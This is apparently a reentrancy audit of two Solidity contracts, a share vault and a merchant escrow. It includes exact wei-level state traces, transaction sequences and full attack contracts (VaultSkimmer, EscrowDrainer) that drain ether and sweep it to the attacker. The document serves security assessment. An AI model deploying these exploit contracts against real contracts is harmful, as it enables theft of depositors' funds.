# Reentrancy Assessment

Scope: `EtherShareVault.redeem` and `MerchantEscrow.release`.
Target: Solidity 0.8.x checked arithmetic, current Ethereum mainnet EVM.
Only the two named source files were read.

All ether figures below are in wei where precision matters (1 ether = 1e18). Several
earlier "napkin" results that treat 1 ether as 1 unit are wrong because integer
division behaves very differently at 1e18 scale — the fractional shares that make the
vault attack profitable survive floor division at wei precision. The numbers here are
computed in wei.

---

## 1. EtherShareVault.redeem

```solidity
function redeem(uint256 shares) external returns (uint256 assets) {
    assets = previewRedeem(shares);                 // read price (balance-based)
    (bool ok, ) = msg.sender.call{value: assets}(""); // EXTERNAL CALL
    if (!ok) revert PayoutFailed();
    _burn(msg.sender, shares);                        // state update AFTER call
    emit Withdraw(msg.sender, assets, shares);
}
function previewRedeem(uint256 shares) public view returns (uint256) {
    return (shares * totalAssets()) / totalShares;    // totalAssets() == address(this).balance
}
```

### Verdict: EXPLOITABLE

Not via same-function reentrancy (that self-corrects and tends to revert — see §1.4),
but via **cross-function reentrancy**: re-entering `deposit()` during `redeem()`'s
payout, when the share price is transiently depressed. The attacker mints excess shares
cheaply, diluting honest holders, then redeems for a net ether profit. Honest users
lose funds.

### 1.1 Assumptions
- `deposit()` and `redeem()` are permissionless; no roles, no pause, no reentrancy guard.
- `totalAssets()` returns the live contract balance. During `redeem`'s external call the
  ether has already left, so balance is reduced, but `totalShares` is **not** reduced
  (the `_burn` happens after the call). Share price as seen by the contract is therefore
  transiently **too low** mid-redeem.
- Victim has deposited 10 ether. Attacker has ~1 ether of capital (that is enough; the
  reentry deposit is funded by the ether the redeem pays out, see below).
- `strategy keeper` pushing yield is irrelevant to the attack.

### 1.2 Exact state trace (wei)

Start: victim deposited 10e18.
`totalShares T = 10e18`, `balance B = 10e18`, `sharesOf[V] = 10e18`.

Attacker seeds 1 share — `deposit{value: 1e18}`:
`assetsBefore = (11e18) - 1e18 = 10e18`; `shares = 1e18 * 10e18 / 10e18 = 1e18`.
Now `T = 11e18`, `B = 11e18`, `sharesOf[A] = 1e18`.

Attacker calls `redeem(1e18)`:
- `assets = previewRedeem(1e18) = 1e18 * 11e18 / 11e18 = 1e18`.
- External call sends 1e18 to attacker. **At point of call**: `B = 10e18`, `T = 11e18`
  (share not yet burned). Contract-perceived price = `B/T = 10e18/11e18 ≈ 0.909` ether
  per share — depressed from the true 1.0.
- **Inside the re-entered call**, attacker's `receive()` calls `deposit{value: 1e18}`
  (using the 1e18 just received):
  `totalAssets() = 10e18 + 1e18 = 11e18`; `assetsBefore = 11e18 - 1e18 = 10e18`;
  `shares = 1e18 * 11e18 / 10e18 = 1.1e18`.  ← **1.1 shares for 1 ether** (floor of
  1.1e18 is exactly 1.1e18 — no rounding loss at wei scale).
  Now `T = 12.1e18`, `B = 11e18`, `sharesOf[A] = 2.1e18`.
- Reentry returns; outer `redeem` runs `_burn(A, 1e18)`:
  `sharesOf[A] = 1.1e18`, `T = 11.1e18`, `B = 11e18`. (No underflow: 2.1e18 ≥ 1e18.)

**After unwinding**: `B = 11e18`, `T = 11.1e18`, `sharesOf[A] = 1.1e18`,
`sharesOf[V] = 10e18`.

Attacker cashes out — `redeem(1.1e18)`:
`assets = 1.1e18 * 11e18 / 11.1e18 = 12.1e36 / 11.1e18 ≈ 1.090090e18`.
Sends ≈1.09009e18. `B ≈ 9.90991e18`, `T = 10e18`, `sharesOf[A] = 0`.

**Net result**
- Attacker: in = 1e18 (seed). out = 1e18 (first redeem) + 1.09009e18 (cash out). The
  first redeem's 1e18 was recycled into the reentry deposit, so end cash = 1.09009e18.
  **Profit ≈ +0.09009e18 (~0.09 ether).**
- Victim: holds 10e18 shares, `B = 9.90991e18`, `T = 10e18`. `redeem(10e18)` →
  ≈9.90991e18. **Loss ≈ 0.09009 ether.**

Theft is conserved: attacker gains exactly what victim loses. Per-round gain is
`v · f/(1−f)` where `v` is the reentry deposit and `f` the attacker's share fraction at
redeem time (here `v=1e18`, `f = 1/11`, gain ≈ 0.1·v). It scales up with attacker stake
and can be repeated/compounded (each round raises `f`), and the reentry deposit can be
as large as the attacker's wallet — so the 0.09 figure is a floor, not a cap.

### 1.3 Attack code (Solidity 0.8.20)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable returns (uint256);
    function redeem(uint256 shares) external returns (uint256);
    function sharesOf(address) external view returns (uint256);
}

contract VaultSkimmer {
    IVault public immutable vault;
    address public immutable owner;
    uint256 private reDeposit;   // amount to re-deposit during redeem
    bool    private entered;

    constructor(IVault v) { vault = v; owner = msg.sender; }

    // Step 1: buy initial shares.
    function seed() external payable { vault.deposit{value: msg.value}(); }

    // Step 2: redeem the seed shares; re-deposit `depositDuring` at the dip.
    function attack(uint256 redeemShares, uint256 depositDuring) external {
        reDeposit = depositDuring;
        entered   = false;
        vault.redeem(redeemShares);   // triggers receive() -> deposit at depressed price
    }

    // Step 3: redeem everything (now inflated) and sweep.
    function cashOut() external {
        uint256 s = vault.sharesOf(address(this));
        if (s > 0) vault.redeem(s);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!entered && reDeposit > 0 && address(this).balance >= reDeposit) {
            entered = true;
            vault.deposit{value: reDeposit}();   // mint cheap shares mid-redeem
        }
    }
}
```

### Transaction sequence
1. `V` (victim): `vault.deposit{value: 10 ether}()`  → 10e18 shares.
2. `A` (attacker, owner of `VaultSkimmer`): `skimmer.seed{value: 1 ether}()`
   → skimmer holds 1e18 shares. (Total attacker capital committed: 1 ether.)
3. `A`: `skimmer.attack(1e18, 1e18)` — sender `A`, value 0. The redeem pays 1 ether into
   the skimmer, whose `receive()` re-deposits that same 1 ether at the dip, minting
   1.1e18 shares; redeem then burns 1e18, leaving 1.1e18 shares.
4. `A`: `skimmer.cashOut()` — redeems 1.1e18 shares for ≈1.09009 ether, forwards to `A`.

### Expected balances after
- `VaultSkimmer`/attacker: started 1 ether, ends ≈1.09009 ether → **+0.09 ether**.
- Vault: `B ≈ 9.90991e18`, owes victim 10e18 shares → victim can only get ≈9.90991 ether
  → **victim −0.09 ether**.

### 1.4 Note on the other reentry paths
- **Same-function (redeem→redeem):** during reentry `balance` has dropped but
  `totalShares` is unchanged, so `previewRedeem` returns *less*, not more — nested
  redeems pay progressively lower amounts. Worse for the attacker, and the nested
  `_burn` calls together can burn at most the shares owned; any attempt to burn more
  reverts via checked-arithmetic underflow in `_burn` (`sharesOf[from] -= shares`). So
  same-function reentrancy is self-defeating, not the vector.
- **Read-only reentrancy:** `previewRedeem`/`totalAssets` are provably inconsistent
  during the external call (balance reduced, shares not). Any integrator pricing off
  them mid-redeem is misled. More to the point, this contract's *own* `deposit()`
  consumes that inconsistent state — which is exactly the exploit above.

### Confidence: high

---

## 2. MerchantEscrow.release

```solidity
function release() external {
    uint256 amount = _escrowOf[msg.sender];
    if (amount == 0) revert NothingToRelease();
    _settle(msg.sender, amount);
}
function _settle(address merchant, uint256 amount) internal {
    _pushNative(merchant, amount);     // EXTERNAL CALL first
    _escrowOf[merchant] = 0;           // state update AFTER
    _totalEscrowed -= amount;
    emit Released(merchant, amount);
}
function _pushNative(address to, uint256 amount) private {
    (bool ok, ) = payable(to).call{value: amount}("");
    if (!ok) revert NativeTransferFailed();
}
```

### Verdict: EXPLOITABLE

Textbook single-function reentrancy drain. `_escrowOf[msg.sender]` is read, the ether is
pushed, and only *after* the push is the balance zeroed. A contract merchant re-enters
`release()` from its `receive()` while its escrow still reads the full amount, and pulls
its balance repeatedly until the whole contract (every merchant's escrow) is drained.

### 2.1 Assumptions
- `pay(address)` is permissionless, so the attacker can become a merchant with nonzero
  escrow by paying itself (or having anyone pay it). `release()` is permissionless.
- No reentrancy guard, no pull-pattern, no pause.
- Contract custodies the pooled funds of all merchants + fee collector; its balance
  equals `_totalEscrowed` (barring stray ether).
- Attacker capital: just enough for a nonzero escrow (e.g. a 1-ether self-payment →
  0.995 ether escrow after the 50 bps fee). Victim merchant holds 10 ether escrow.

### 2.2 Exact state trace
Simplify to attacker escrow `E = 1e18`, victim escrow `10e18`, fee collector `0`
(folding fees in does not change the mechanism); `_totalEscrowed = 11e18`,
`balance = 11e18`.

Attacker contract calls `release()`:
- `amount = _escrowOf[A] = 1e18` (≠0).
- `_settle(A, 1e18)` → `_pushNative(A, 1e18)` sends 1e18. **At the call**:
  `balance = 10e18`, `_escrowOf[A]` still `1e18`, `_totalEscrowed` still `11e18`.
  - `receive()` re-enters `release()`: `amount = _escrowOf[A] = 1e18` again. Pushes
    another 1e18 → `balance = 9e18`. Re-enters again… and so on.
- The attacker re-enters until the contract balance would no longer cover another 1e18
  push (checking `address(escrow).balance >= E` before recursing, so no push reverts).
  With balance 11e18 and `E = 1e18`, that is **11 pushes = 11 ether pulled**.
- **Unwinding**: each of the 11 nested `_settle` frames now runs
  `_escrowOf[A] = 0; _totalEscrowed -= 1e18`. `_totalEscrowed`: 11e18 → 0 over 11
  subtractions — no checked-arithmetic underflow (`11e18 − 11·1e18 = 0`). `_escrowOf[A]`
  is *set* to 0, never decremented, so no underflow there either.

**After**: `balance = 0`, `_escrowOf[A] = 0`, `_totalEscrowed = 0`, but
`_escrowOf[victim]` is still `10e18`.

**Net result**
- Attacker: entitled to 1 ether, received **11 ether** → **+10 ether** profit.
- Victim: `release()` reverts with `NativeTransferFailed` (contract balance 0).
  **Loss: entire 10 ether.**

### 2.3 Attack code (Solidity 0.8.20)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEscrow {
    function pay(address merchant) external payable;
    function release() external;
    function escrowOf(address merchant) external view returns (uint256);
}

contract EscrowDrainer {
    IEscrow public immutable escrow;
    address public immutable owner;

    constructor(IEscrow e) { escrow = e; owner = msg.sender; }

    // Become a merchant with nonzero escrow.
    function seed() external payable { escrow.pay{value: msg.value}(address(this)); }

    // Kick off the drain.
    function attack() external { escrow.release(); }

    receive() external payable {
        // Keep re-entering while the contract can still pay our (unchanged) escrow.
        uint256 e = escrow.escrowOf(address(this));   // stays == E until finally zeroed
        if (e > 0 && address(escrow).balance >= e) {
            escrow.release();
        }
    }

    function sweep() external {
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}
```

### Transaction sequence
1. Victim merchant `V` receives escrow: e.g. buyer `pay{value: 10 ether}(V)` →
   `_escrowOf[V] ≈ 9.95 ether` (ignoring the 0.05 fee for clarity; using 10 above).
2. `A`: `drainer.seed{value: 1 ether}()` → `_escrowOf[drainer] ≈ 0.995 ether`.
   (Values above use `E = 1e18` exactly; the mechanism is identical with the fee.)
3. `A`: `drainer.attack()` — sender `A`, value 0. `release()` re-enters itself through
   `receive()` until the contract balance is exhausted.
4. `A`: `drainer.sweep()` — forwards the drained balance to `A`.

### Expected balances after
- `EscrowDrainer`/attacker: ~contract's entire balance (≈11 ether in the simplified
  model), vs ~1 ether seeded → **≈+10 ether**.
- Escrow contract: **0 ether**; victim's `_escrowOf` still shows 10 ether but is
  unredeemable → **victim −10 ether**.

### 2.4 Other reentry paths
- **Cross-function:** `pay()` only credits (adds ether), so re-entering `pay` during
  `release` cannot extract value; the drain is driven entirely by self-reentering
  `release`.
- **Read-only reentrancy:** `escrowOf`/`totalEscrowed` are inconsistent during the push
  (balance gone, `_escrowOf` not yet zeroed) — the drainer itself relies on `escrowOf`
  still reading `E` mid-call. Any external integrator is likewise misled, but the direct
  drain already fully compromises the contract.
- **Checked arithmetic does not save it:** `_totalEscrowed -= amount` only underflows if
  pulled strictly more than `_totalEscrowed` (== balance), and the push to send beyond
  the balance reverts first; a drainer that stops at the balance (as above) completes
  cleanly with `_totalEscrowed` reaching exactly 0.

### Confidence: high
```
```

---

## Summary table

| Function | Vector | Verdict | Confidence |
|---|---|---|---|
| `EtherShareVault.redeem` | cross-function (deposit at depressed mid-redeem price) | EXPLOITABLE | high |
| `MerchantEscrow.release` | same-function reentrancy drain | EXPLOITABLE | high |
